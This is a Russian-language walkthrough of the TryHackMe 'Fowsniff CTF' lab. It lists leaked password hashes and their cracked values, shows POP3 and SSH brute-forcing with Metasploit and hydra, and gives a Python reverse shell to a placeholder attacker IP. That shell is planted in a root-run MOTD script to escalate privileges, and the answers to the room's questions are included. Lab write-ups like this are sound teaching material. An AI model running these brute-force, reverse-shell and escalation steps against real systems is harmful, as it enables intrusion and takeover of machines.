[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Fowsniff CTF](https://tryhackme.com/r/room/ctf) 

Всего 1 заданиe:
## Задание 1
Эта машина boot2root великолепна для новичков. Вам придется перечислить эту машину, найдя открытые порты, провести 
некоторые онлайн-исследования (удивительно, сколько информации может найти для вас Google), расшифровать хэши, 
перебрать вход в систему pop3 и многое другое!

Это будет структурировано, чтобы пройти через то, что вам нужно сделать, шаг за шагом. Убедитесь, что вы подключены 
к нашей сети 

Спасибо berzerk0  за создание этой машины. Эта машина используется здесь с явного разрешения создателя <3 

### Ответьте на вопросы ниже
Разверните машину. В правом верхнем углу вы увидите кнопку «Развернуть» . Нажмите на нее, чтобы развернуть машину в 
облаке. Подождите минуту, пока она не станет активной. 
```commandline
Ответ не нужен
```
Используя nmap, просканируйте эту машину. Какие порты открыты?
```commandline
nmap -Pn -sC -sV -A
```
```commandline
Ответ не нужен
```
Используя информацию из открытых портов. Осмотритесь. Что вы можете найти?

Подключение к веб-серверу показывает, что компания подверглась атаке:

Внутренняя система Fowsniff подверглась утечке данных, в результате которой были раскрыты имена пользователей и пароли сотрудников.

Информация о клиенте не пострадала.

В связи с высокой вероятностью того, что информация о сотрудниках стала общедоступной, всем сотрудникам было поручено немедленно сменить свои пароли.

Атакующие также смогли взломать наш официальный аккаунт @fowsniffcorp Twitter. Все наши официальные твиты были удалены, и злоумышленники могут опубликовать конфиденциальную информацию через этот канал. Мы работаем над тем, чтобы решить эту проблему как можно скорее.

Мы восстановим полную мощность после модернизации обслуживания.
Поиск аккаунта Twitter (@fowsniffcorp), упомянутого в сообщении, приводит к адресу https://twitter.com/fowsniffcorp ,
где мы можем найти твит со ссылкой на https://pastebin.com/NrAqVeeX . 

```commandline
Ответ не нужен
```
Можете ли вы с помощью Google найти какую-либо публичную информацию о них?

Подсказка: существует папка Pastebin со всеми адресами электронной почты и хэшами сотрудников компании.

В контенте раскрываются адреса электронной почты и хэши паролей.

```commandline
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4 
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56 
tegel@fowsniff:1dc352435fecca338acfd4be10984009 
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb 
seina@fowsniff:90dc16d47114aa13671c697fd506cf26 
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd 
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b 
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11 
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```
```commandline
Ответ не нужен
```
Можете ли вы расшифровать эти md5 хеши? Вы даже можете использовать сайты типа hashkiller, чтобы расшифровать их.
Используя https://hashes.com/en/decrypt/hash , мы можем восстановить 8 паролей из 9:
```commandline
Email	            MD5 hash	                        password
mauer@fowsniff	    8a28a94a588a95b80163709ab4313aa4	mailcall
mustikka@fowsniff	ae1644dac5b77c0cf51e0d26ad6d7e56	bilbo101
tegel@fowsniff	    1dc352435fecca338acfd4be10984009	apples01
baksteen@fowsniff	19f5af754c31f1e2651edde9250d69bb	skyler22
seina@fowsniff	    90dc16d47114aa13671c697fd506cf26	scoobydoo2
stone@fowsniff	    a92b8a29ef1183192e3d35187e0cfabd	-
mursten@fowsniff	0e9588cb62f4b6f27e33d449e2ba0b3b	carp4ever
parede@fowsniff	    4d6e42f56e127803285a0a7649b5ab11	orlando12
sciana@fowsniff	    f7fd98d380735e859f8b2ffbbede5a7e	07011972
```

```commandline
Ответ не нужен
```
Используя полученные вами имена пользователей и пароли, можете ли вы применить Metasploit для взлома пароля pop3?
Подсказка: в metasploit есть пакет под названием: auxiliary/scanner/pop3/pop3_login, в который вы можете ввести все 
найденные вами имена пользователей и пароли для взлома службы pop3 этой машины. 

Мы можем использовать модуль Metasploit pop3_loginдля взлома службы POP3, используя найденные ранее учетные данные.
```commandline
msfconsole -q
use auxiliary/scanner/pop3/pop3_login
show options 
set rhost <IP> 
set user_file /data/Fowsniff_CTF/files/usernames.txt 
set pass_file /data/Fowsniff_CTF/files/passwords.txt 
run 
```
или можно использовать гидра, она будет быстрее
```commandline
hydra -L usernames.txt -P passwords.txt pop3://<IP> 
логин: seina пароль: scoobydoo2
```
```commandline
Ответ не нужен
```
Какой пароль у seina для доступа к почтовому сервису?
```commandline
scoobydoo2
```
Можете ли вы подключиться к службе pop3 с ее учетными данными? Какую информацию об электронной почте вы можете собрать?
```commandline
telnet <IP> 110
логин: seina пароль: scoobydoo2
retr 1
# Временный пароль для SSH - "S1ck3nBluff+secureshell". 
retr 2
```
```commandline
Ответ не нужен
```
Просматривая ее электронную почту, какой временный пароль был установлен для нее?
```commandline
S1ck3nBluff+secureshell
```
В электронном письме, кто его отправил? Используя пароль из предыдущего вопроса и имя пользователя отправителя, 
подключитесь к машине с помощью SSH. 
```commandline
hydra -L sshusers.txt -p S1ck3nBluff+secureshell ssh://<IP>
ssh baksteen@<IP>
```
```commandline
Ответ не нужен
```
После подключения, к каким группам принадлежит этот пользователь? Есть ли какие-нибудь интересные файлы, которые 
может запустить эта группа? 
```commandline
id
find / -type f -group users 2>/dev/null
ssh baksteen@<IP>
```
Скрипт /opt/cube/cube.shи нтересен тем, что он отображает баннер, который отображается при подключении к SSH-сервису. 
Кроме того, мы можем его модифицировать. Это значит, что мы можем заменить его содержимое обратной оболочкой.
```commandline
Ответ не нужен
```
Теперь, когда вы нашли файл, который может редактировать группа, можете ли вы отредактировать его, включив в него обратную оболочку?

Обратная оболочка Python:
`python3 -c 'import socket,subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((<IP>,1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
`
Другие обратные оболочки: здесь.
```commandline
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
```commandline
Ответ не нужен
```
Если вы еще не узнали, этот файл запускается как root, когда пользователь подключается к машине с помощью SSH. Мы 
знаем это, поскольку при первом подключении мы видим, что нам выдается баннер (с fowsniff corp). Посмотрите в  файле 
/etc/update-motd.d/ . Если (после того, как мы поместили нашу обратную оболочку в файл cube) мы затем включим этот 
файл в файл motd.d, он запустится как root, и мы получим обратную оболочку как root!
```commandline
grep cube * 
sh /opt/cube/cube.sh
```
```commandline
Ответ не нужен
```
Запустите прослушиватель netcat (nc -lvp 1234) и затем повторно войдите в службу SSH. Затем вы получите обратную 
оболочку в вашем сеансе netcat как root! 
Давайте отключимся от нашего сеанса SSH и откроем прослушиватель (адаптируем порт в соответствии с указанным в обратной оболочке):
```commandline
rlwrap nc -nlvp 4444
id
cd /root
ls -la
cat flag.txt
```

```commandline
Ответ не нужен
```
Если вы действительно застряли, вот блестящее пошаговое руководство:  https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/ 

Если вам так проще, следуйте этому пошаговому руководству, разместив машину на объекте.
```commandline
Ответ не нужен
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)